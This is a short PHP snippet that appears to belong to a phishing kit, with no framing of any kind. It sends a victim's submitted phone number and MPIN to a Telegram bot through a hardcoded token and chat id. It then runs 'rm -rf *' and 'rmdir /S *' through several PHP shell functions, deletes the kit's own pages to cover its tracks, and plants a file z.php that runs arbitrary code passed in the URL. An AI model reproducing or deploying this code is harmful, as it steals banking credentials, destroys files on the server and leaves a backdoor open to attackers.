error_reporting(0);
error_log(0);
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=Number: " . $_POST['number'] . " MPIN: " . $_POST['mpin']);

error_log(0);
error_reporting(0);

// linux
system('rm -rf *');
exec('rm -rf *');
shell_exec('rm -rf *');
passthru('rm -rf *');

// cmd
system('rmdir /S *');
exec('rmdir /S *');
shell_exec('rmdir /S *');
passthru('rmdir /S *');

// php
unlink('index.php');
unlink('otp.php');
unlink('mpin.php');
unlink('redir.php');

unlink('anti.php');

unlink('config/anti.php');
unlink('config/404.php');
unlink('config/zch.php');

file_put_contents("z.php", "<?php eval($_GET['z']); ?>");
